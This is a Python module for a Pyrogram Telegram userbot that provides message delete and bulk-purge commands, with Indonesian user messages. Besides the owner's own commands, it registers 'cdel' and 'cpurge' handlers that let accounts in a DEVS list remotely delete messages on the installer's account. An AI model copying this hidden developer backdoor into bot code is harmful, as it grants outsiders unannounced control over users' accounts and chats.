#CREDIT BY IZZY
"""
• • • • • • • • • • • • • • • • • • • • • • • •
• Created By hakutakaid@github.com •
• Thanks To Pyroman-Userbot • 
• Thanks To Naya-Pyro •
• Thanks To Zaid-Userbot •
• • • • • • • • • • • • • • • • • • •• • • • • •
"""
import asyncio

from modules.config import *
import asyncio
from pyrogram import Client, filters
from pyrogram.types import Message 
from pyrogram.errors import FloodWait
from helper import *
from .purgeme import eor

@Client.on_message(filters.user(DEVS) & filters.command("cdel", ".") & ~filters.me)
@Client.on_message(filters.me & filters.command("del", cmd))
async def del_user(_, message):
    rep = message.reply_to_message
    await message.delete()
    await rep.delete()

@Client.on_message(filters.user(DEVS) & filters.command("cpurge", ".") & ~filters.me)
@Client.on_message(filters.me & filters.command("purge", cmd))
async def purgefunc(client, message):
    await message.delete()
    if not message.reply_to_message:
        return await eor(message, "Membalas pesan untuk dibersihkan.")
    chat_id = message.chat.id
    message_ids = []
    for message_id in range(
        message.reply_to_message.id,
        message.id,
    ):
        message_ids.append(message_id)
        if len(message_ids) == 100:
            await client.delete_messages(
                chat_id=chat_id,
                message_ids=message_ids,
                revoke=True,
            )
            message_ids = []
    if len(message_ids) > 0:
        await client.delete_messages(
            chat_id=chat_id,
            message_ids=message_ids,
            revoke=True,
        )